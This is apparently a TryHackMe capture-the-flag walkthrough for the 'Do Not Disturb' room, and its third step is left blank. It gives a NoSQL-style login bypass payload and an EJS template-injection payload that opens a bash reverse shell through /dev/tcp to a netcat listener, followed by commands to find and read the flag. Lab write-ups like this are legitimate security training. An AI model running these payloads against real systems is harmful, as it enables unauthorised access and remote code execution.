## Hello
<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251618019&w=96&q=75">
</p>

# Do Not Disturb

In this room, the objective is to exploit an EJS injection vulnerability to gain initial access, establish a reverse shell, and complete the challenge by reaching the target Flags.

Target application:
```
http://MACHINE_IP
```
Goal:
- [x] Obtain user.txt
- [x] Obtain root.txt



## STEP 01

- Start with the SSI (Server Side Injection)
- Open the developer option `F12`
- Navigate to the `Network Tab`
- Enable `cache`
- Then check Header info
  ```bash
  curl -I http://<MACHINE_IP>
  ```
  IMPORTANT
  ```text
  Web server: Express (Node.js)
  Endpoint: POST /login
  ```
  > According to this, we can see the application is likely a Node.js web application using the Express.js framework.

- Check available routes
  ```bash
  gobuster dir -u http://10.48.151.238 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
  output:
  ```
  /login
  /staff
  ```
- Try fake login
  ```
  username: admin
  password: 1234
  ```
- Then go to the `Network Tab`
- Select the request,
- Right-click and `Edit and resend.`
- Then add the Express js Payload
  ```
  username=attendant&password[$ne]=x
  ```
-  Resend the request
-  Check the request for `Set-cookie`
-  Then copy the `Content-ID` and `value` separately
- Go to the staff page tab
- Select the `Storage` Tab
- Select `cookies` and `Create New cookie`
- Paste the `Content ID` and `value`
- Refresh
- Then log in to the app


## STEP 02
- Now the EJS Injection part
- Open a new terminal and start `NC listener`
  ```
  nc -nvlp 2500
  ```
- Use this EJS payload
  ```
  <pre><%= process.getBuiltinModule('child_process').execSync('bash -c "bash -i >& /dev/tcp/<YOURMACHINEIP>/2500 0>&1"').toString() %></pre>
  ```
- This will open a reverse shell for you from root.
- Then check privileges
  ```
  whoami
  ```
- Then search for `user.txt`
  ```
  find / -name "user.txt" 2>/dev/null
  ```
- Go to the folder and open it
  ```
  cat user.txt
  ```
- you found the user flag

## STEP 03
- 

## You have found the  **TWO FLAGs** 🚩

# Congratulations on our Exploration 🎉
